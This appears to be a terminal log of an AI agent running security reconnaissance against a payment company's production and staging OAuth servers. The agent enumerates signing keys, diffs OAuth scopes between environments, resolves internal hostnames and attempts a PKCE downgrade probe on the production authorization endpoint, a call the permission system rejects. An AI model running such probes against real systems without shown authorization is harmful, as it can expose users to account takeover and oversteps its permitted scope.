+     idx=3 kty=RSA alg=RS256 use=sig keyfp=1044d26c915b1461
+  kid=public:32ad4b15-8641-4aaa-9a2e-427bb1848321
+     idx=4 kty=RSA alg=RS256 use=sig keyfp=6dfc4d53d154324b
+  kid=public:8e43ec38-e8f1-47e4-aa6c-9990c3ae20b3
+     idx=5 kty=RSA alg=RS256 use=sig keyfp=40650209083b42e3
+  kid=1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM
+     idx=6 kty=RSA alg=RS256 use=None keyfp=4d3ca5f45f14ac7a
+  kid=-tfiDUnEWW4Kz5Jqt0T-q85aqJkYkZsx0n3qPa-6sw4
+     idx=7 kty=OKP alg=EdDSA use=None keyfp=fc2b8c2dbd262900
+
+===== auth.sam-app.ro  (11 entries)
+  kid=2ca76842-2487-428f-a87f-603d1f6f6ef0
+     idx=0 kty=RSA alg=RS256 use=sig keyfp=52892b20450359ea
+  kid=ugK7GDfOf35HE5n2Pwsy9K3HSnYWNPGbRnWRscc83Lg
+     idx=1 kty=OKP alg=EdDSA use=sig keyfp=cb46d601e1a48bda
+  kid=public:73c59380-fbab-4a2f-8d0e-1884cf8ec724
+     idx=2 kty=RSA alg=RS256 use=sig keyfp=a12a70e134b7d9fc
+  kid=public:b2aafe4c-7d7f-4f32-90a7-66a0fc9cd097
+     idx=3 kty=RSA alg=RS256 use=sig keyfp=50af9b4b500df181
+  kid=public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a  <== DUPLICATE KID
+     idx=4 kty=RSA alg=RS256 use=sig keyfp=91ac0eba8cb68e73
+     idx=8 kty=RSA alg=RS256 use=sig keyfp=91ac0eba8cb68e73
+  kid=public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9  <== DUPLICATE KID
+     idx=5 kty=RSA alg=RS256 use=sig keyfp=b18bb153373e1b49
+     idx=9 kty=RSA alg=RS256 use=sig keyfp=b18bb153373e1b49
+  kid=public:3862035e-6139-422f-b17d-cf67b950a74f
+     idx=6 kty=RSA alg=RS256 use=sig keyfp=93771b0265e4534f
+  kid=public:e1d0f7e4-aab6-424e-8e2b-7549ac77f514
+     idx=7 kty=RSA alg=RS256 use=sig keyfp=a26cfa87e799d503
+  kid=loadtesting
+     idx=10 kty=RSA alg=RS256 use=sig keyfp=668ae2858c68c618
+  VERDICT public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a: 2 entries, 1 distinct key material -> IDENTICAL key material (benign duplicate)
+  VERDICT public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9: 2 entries, 1 distinct key material -> IDENTICAL key material (benign duplicate)
+
+===== auth-theta.sam-app.ro  (10 entries)
+  kid=ca3dad7a-e595-4d70-b58b-3b91467b9580
+     idx=0 kty=RSA alg=RS256 use=sig keyfp=290162c7a453d39f
+  kid=jKHXok6K_GJzZdwwgcpgKWbE8iOacZTX2O57V_8KAsU
+     idx=1 kty=OKP alg=EdDSA use=sig keyfp=96924516cec73fed
+  kid=public:d599e3ae-6178-4745-96cf-290a678170d6
+     idx=2 kty=RSA alg=RS256 use=sig keyfp=6f5f9dd075355475
+  kid=public:bc46d82e-25f2-470b-a527-5ca2f280203e  <== DUPLICATE KID
+     idx=3 kty=RSA alg=RS256 use=sig keyfp=1a002c07cf53de59
+     idx=7 kty=RSA alg=RS256 use=sig keyfp=1a002c07cf53de59
+  kid=public:2fbc8e2a-bea4-4e47-81cd-fd83a90fe82d
+     idx=4 kty=RSA alg=RS256 use=sig keyfp=8b95c9d49c874fed
+  kid=public:7e4251a6-cb53-485d-96b9-d9a2057d95db
+     idx=5 kty=RSA alg=RS256 use=sig keyfp=9bd192cb18d24e55
+  kid=public:990fbf94-5aec-4194-85a4-594be542fac8
+     idx=6 kty=RSA alg=RS256 use=sig keyfp=b76638c806b77d8a
+  kid=loadtesting
+     idx=8 kty=RSA alg=RS256 use=sig keyfp=3f708b90c2ad1292
+  kid=public:33b3e8b4-149a-4d0f-be17-a995bef70222
+     idx=9 kty=RSA alg=RS256 use=sig keyfp=25afecf9c5592be7
+  VERDICT public:bc46d82e-25f2-470b-a527-5ca2f280203e: 2 entries, 1 distinct key material -> IDENTICAL key material (benign duplicate)
+[0m
+[0m$ [0mfor h in auth.sumup.com auth.sam-app.ro auth-theta.sam-app.ro; do curl -sS --max-time 15 "https://$h/.well-known/openid-configuration" -o "/tmp/oc_${h}.json" -w "$h [http %{http_code}]\n"; sleep 2; done
+python3 - <<'PY'
+import json
+docs={h:json.load(open(f'/tmp/oc_{h}.json')) for h in ['auth.sumup.com','auth.sam-app.ro','auth-theta.sam-app.ro']}
+allk=set()
+for d in docs.values(): allk |= set(d.get('scopes_supported',[]))
+print(f"{'scope':<34}{'prod':<7}{'staging':<9}{'theta'}")
+print('-'*60)
+for s in sorted(allk):
+    print(f"{s:<34}{'Y' if s in docs['auth.sumup.com'].get('scopes_supported',[]) else '-':<7}"
+          f"{'Y' if s in docs['auth.sam-app.ro'].get('scopes_supported',[]) else '-':<9}"
+          f"{'Y' if s in docs['auth-theta.sam-app.ro'].get('scopes_supported',[]) else '-'}")
+print()
+for h,d in docs.items():
+    print(f"{h}: {len(d.get('scopes_supported',[]))} scopes | auth_methods={d.get('token_endpoint_auth_methods_supported')}")
+    print(f"   grant_types={d.get('grant_types_supported')}")
+    print(f"   registration_endpoint={d.get('registration_endpoint','<absent>')}  revocation={d.get('revocation_endpoint','<absent>')}")
+p=set(docs['auth.sumup.com']['scopes_supported']); 
+for h in ['auth.sam-app.ro','auth-theta.sam-app.ro']:
+    e=set(docs[h]['scopes_supported'])
+    print(f"\n{h} NOT in prod ({len(e-p)}): {sorted(e-p)}")
+    print(f"prod NOT in {h} ({len(p-e)}): {sorted(p-e)}")
+PY
+auth.sumup.com [http 200]
+auth.sam-app.ro [http 200]
+auth-theta.sam-app.ro [http 200]
+scope                             prod   staging  theta
+------------------------------------------------------------
+api_keys.read                     -      Y        Y
+api_keys.write                    -      Y        Y
+checkouts.read                    -      Y        Y
+checkouts.write                   -      Y        Y
+classic                           Y      -        -
+customers.read                    -      Y        Y
+customers.write                   -      Y        Y
+email                             Y      -        -
+members.read                      -      Y        Y
+members.write                     -      Y        Y
+merchants.read                    -      Y        Y
+merchants.write                   -      Y        Y
+offline                           Y      -        -
+offline_access                    Y      Y        Y
+openid                            Y      -        -
+payouts.read                      -      Y        Y
+readers.read                      -      Y        Y
+readers.write                     -      Y        Y
+receipts.read                     -      Y        Y
+refunds.write                     -      Y        Y
+roles.read                        -      Y        Y
+roles.write                       -      Y        Y
+sales.read                        -      Y        Y
+transactions.read                 -      Y        Y
+
+auth.sumup.com: 5 scopes | auth_methods=['client_secret_post', 'client_secret_basic', 'private_key_jwt', 'none']
+   grant_types=['authorization_code', 'implicit', 'client_credentials', 'refresh_token']
+   registration_endpoint=<absent>  revocation=https://auth.sumup.com/oauth2/revoke
+auth.sam-app.ro: 20 scopes | auth_methods=['client_secret_post', 'private_key_jwt', 'none']
+   grant_types=['authorization_code', 'client_credentials', 'refresh_token', 'urn:ietf:params:oauth:grant-type:device_code']
+   registration_endpoint=https://auth.sam-app.ro/oauth2/register  revocation=https://auth.sam-app.ro/oauth2/revoke
+auth-theta.sam-app.ro: 20 scopes | auth_methods=['client_secret_post', 'private_key_jwt', 'none']
+   grant_types=['authorization_code', 'client_credentials', 'refresh_token', 'urn:ietf:params:oauth:grant-type:device_code']
+   registration_endpoint=https://auth-theta.sam-app.ro/oauth2/register  revocation=https://auth-theta.sam-app.ro/oauth2/revoke
+
+auth.sam-app.ro NOT in prod (19): ['api_keys.read', 'api_keys.write', 'checkouts.read', 'checkouts.write', 'customers.read', 'customers.write', 'members.read', 'members.write', 'merchants.read', 'merchants.write', 'payouts.read', 'readers.read', 'readers.write', 'receipts.read', 'refunds.write', 'roles.read', 'roles.write', 'sales.read', 'transactions.read']
+prod NOT in auth.sam-app.ro (4): ['classic', 'email', 'offline', 'openid']
+
+auth-theta.sam-app.ro NOT in prod (19): ['api_keys.read', 'api_keys.write', 'checkouts.read', 'checkouts.write', 'customers.read', 'customers.write', 'members.read', 'members.write', 'merchants.read', 'merchants.write', 'payouts.read', 'readers.read', 'readers.write', 'receipts.read', 'refunds.write', 'roles.read', 'roles.write', 'sales.read', 'transactions.read']
+prod NOT in auth-theta.sam-app.ro (4): ['classic', 'email', 'offline', 'openid']
+[0m
+[0m$ [0mcommand -v dig >/dev/null && echo "dig: yes" || echo "dig: no"
+for h in web.sumup.com www.sumup.com sumup.com iam-elasticache-prod-eu-west-1.sumup.net legacy-loadbalancer.sumup.com; do echo "--- $h"; getent hosts "$h" 2>/dev/null || python3 -c "
+import socket,sys
+try: print('  A:',socket.gethostbyname('$h'))
+except Exception as e: print('  no A record')" ; done
+echo; echo "=== web.sumup.com HTTP"; curl -sS -o /tmp/w.html -D /tmp/wh.txt --max-time 12 "https://web.sumup.com/" ; head -1 /tmp/wh.txt; grep -iE '^(server|location|content-type)' /tmp/wh.txt; head -c 200 /tmp/w.html
+dig: yes
+--- web.sumup.com
+77.246.42.130   web.sumup.com
+--- www.sumup.com
+104.18.34.207   www.sumup.com.cdn.cloudflare.net www.sumup.com
+172.64.153.49   www.sumup.com.cdn.cloudflare.net www.sumup.com
+--- sumup.com
+76.76.21.21     sumup.com
+--- iam-elasticache-prod-eu-west-1.sumup.net
+  no A record
+--- legacy-loadbalancer.sumup.com
+  no A record
+
+=== web.sumup.com HTTP
+curl: (28) Connection timed out after 12002 milliseconds
+head: cannot open '/tmp/w.html' for reading: No such file or directory
+[0m
+[0m$ [0mpython3 - <<'PY'
+import json
+for h in ['auth.sumup.com','auth.sam-app.ro','auth-theta.sam-app.ro']:
+    d=json.load(open(f'/tmp/oc_{h}.json'))
+    print(f"\n########## {h}  ({len(d)} fields)")
+    for k in sorted(d):
+        if k in ('scopes_supported','claims_supported','grant_types_supported','response_modes_supported','ui_locales_supported'): continue
+        v=d[k]
+        v=json.dumps(v) if not isinstance(v,str) else v
+        print(f"  {k} = {v[:150]}")
+PY
+########## auth.sumup.com  (27 fields)
+  authorization_endpoint = https://auth.sumup.com/oauth2/auth
+  backchannel_logout_session_supported = true
+  backchannel_logout_supported = true
+  claims_parameter_supported = false
+  code_challenge_methods_supported = ["plain", "S256"]
+  end_session_endpoint = https://auth.sumup.com/oauth2/sessions/logout
+  frontchannel_logout_session_supported = true
+  frontchannel_logout_supported = true
+  id_token_signing_alg_values_supported = ["RS256"]
+  issuer = https://auth.sumup.com/
+  jwks_uri = https://auth.sumup.com/.well-known/jwks.json
+  nonce_endpoint = https://auth.sumup.com/oauth2/nonce
+  request_object_signing_alg_values_supported = ["RS256", "none"]
+  request_parameter_supported = true
+  request_uri_parameter_supported = true
+  require_request_uri_registration = true
+  response_types_supported = ["code", "code id_token", "id_token", "token id_token", "token", "token id_token code"]
+  revocation_endpoint = https://auth.sumup.com/oauth2/revoke
+  subject_types_supported = ["public"]
+  token_endpoint = https://auth.sumup.com/oauth2/token
+  token_endpoint_auth_methods_supported = ["client_secret_post", "client_secret_basic", "private_key_jwt", "none"]
+  userinfo_endpoint = https://auth.sumup.com/userinfo
+  userinfo_signing_alg_values_supported = ["none", "RS256"]
+
+########## auth.sam-app.ro  (33 fields)
+  authorization_endpoint = https://auth.sam-app.ro/oauth2/auth
+  backchannel_logout_session_supported = true
+  backchannel_logout_supported = true
+  code_challenge_methods_supported = ["S256"]
+  device_authorization_endpoint = https://auth.sam-app.ro/oauth2/device
+  dpop_signing_alg_values_supported = ["RS256", "RS384", "RS512", "PS256", "PS384", "PS512", "ES256", "ES384", "ES512"]
+  end_session_endpoint = https://auth.sam-app.ro/oauth2/sessions/logout
+  frontchannel_logout_session_supported = true
+  frontchannel_logout_supported = true
+  id_token_signing_alg_values_supported = ["RS256", "EdDSA"]
+  issuer = https://auth.sam-app.ro
+  jwks_uri = https://auth.sam-app.ro/.well-known/jwks.json
+  nonce_endpoint = https://auth.sam-app.ro/oauth2/nonce
+  pushed_authorization_request_endpoint = https://auth.sam-app.ro/oauth2/par
+  registration_endpoint = https://auth.sam-app.ro/oauth2/register
+  request_object_signing_alg_values_supported = ["RS256", "none"]
+  request_parameter_supported = true
+  request_uri_parameter_supported = true
+  require_request_uri_registration = true
+  response_types_supported = ["code", "code id_token", "id_token", "token id_token", "token", "token id_token code"]
+  revocation_endpoint = https://auth.sam-app.ro/oauth2/revoke
+  service_documentation = https://developer.sumup.com/tools/authorization/oauth
+  subject_types_supported = ["public"]
+  token_endpoint = https://auth.sam-app.ro/oauth2/token
+  token_endpoint_auth_methods_supported = ["client_secret_post", "private_key_jwt", "none"]
+  token_endpoint_auth_signing_alg_values_supported = ["RS256", "EdDSA"]
+  userinfo_endpoint = https://auth.sam-app.ro/userinfo
+  userinfo_signing_alg_values_supported = ["none", "RS256"]
+
+########## auth-theta.sam-app.ro  (33 fields)
+  authorization_endpoint = https://auth-theta.sam-app.ro/oauth2/auth
+  backchannel_logout_session_supported = true
+  backchannel_logout_supported = true
+  code_challenge_methods_supported = ["S256"]
+  device_authorization_endpoint = https://auth-theta.sam-app.ro/oauth2/device
+  dpop_signing_alg_values_supported = ["RS256", "RS384", "RS512", "PS256", "PS384", "PS512", "ES256", "ES384", "ES512"]
+  end_session_endpoint = https://auth-theta.sam-app.ro/oauth2/sessions/logout
+  frontchannel_logout_session_supported = true
+  frontchannel_logout_supported = true
+  id_token_signing_alg_values_supported = ["RS256", "EdDSA"]
+  issuer = https://auth-theta.sam-app.ro
+  jwks_uri = https://auth-theta.sam-app.ro/.well-known/jwks.json
+  nonce_endpoint = https://auth-theta.sam-app.ro/oauth2/nonce
+  pushed_authorization_request_endpoint = https://auth-theta.sam-app.ro/oauth2/par
+  registration_endpoint = https://auth-theta.sam-app.ro/oauth2/register
+  request_object_signing_alg_values_supported = ["RS256", "none"]
+  request_parameter_supported = true
+  request_uri_parameter_supported = true
+  require_request_uri_registration = true
+  response_types_supported = ["code", "code id_token", "id_token", "token id_token", "token", "token id_token code"]
+  revocation_endpoint = https://auth-theta.sam-app.ro/oauth2/revoke
+  service_documentation = https://developer.sumup.com/tools/authorization/oauth
+  subject_types_supported = ["public"]
+  token_endpoint = https://auth-theta.sam-app.ro/oauth2/token
+  token_endpoint_auth_methods_supported = ["client_secret_post", "private_key_jwt", "none"]
+  token_endpoint_auth_signing_alg_values_supported = ["RS256", "EdDSA"]
+  userinfo_endpoint = https://auth-theta.sam-app.ro/userinfo
+  userinfo_signing_alg_values_supported = ["none", "RS256"]
+[0m
+[93m[1m! [0mpermission requested: external_directory (/tmp/*); auto-rejecting
+[0m✗ [0mcd /tmp
+# controlled pair on PROD auth server, client_id=dashboard, known-good registered redirect, S256 as control
+S256=$(python3 -c "import base64,os;print(base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode())")
+PLAINV="probeverifier12345678"
+ru="https%3A%2F%2Fme.sumup.com%2Fapi%2Fsso%2Fcallback"
+for m in "S256|$S256" "plain|$PLAINV" "none|" "bogus|$S256"; do
+  meth="${m%%|*}"; cv="${m##*|}"
+  if [ -z "$cv" ]; then q="client_id=dashboard&redirect_uri=$ru&response_type=code&scope=openid&state=teststate1234&code_challenge_method=$meth"; else q="client_id=dashboard&redirect_uri=$ru&response_type=code&scope=openid&state=teststate1234&code_challenge_method=$meth&code_challenge=$cv"; fi
+  echo "=== code_challenge_method=$meth  (cv=${cv:0:12})"
+  curl -sS -o /tmp/o3 -D /tmp/h3 --max-time 12 "https://auth.sumup.com/oauth2/auth?$q"
+  head -1 /tmp/h3; grep -i '^location' /tmp/h3 | head -c 320; echo; head -c 200 /tmp/o3; echo; sleep 3
+done failed
+[91m[1mError: [0mThe user rejected permission to use this specific tool call.
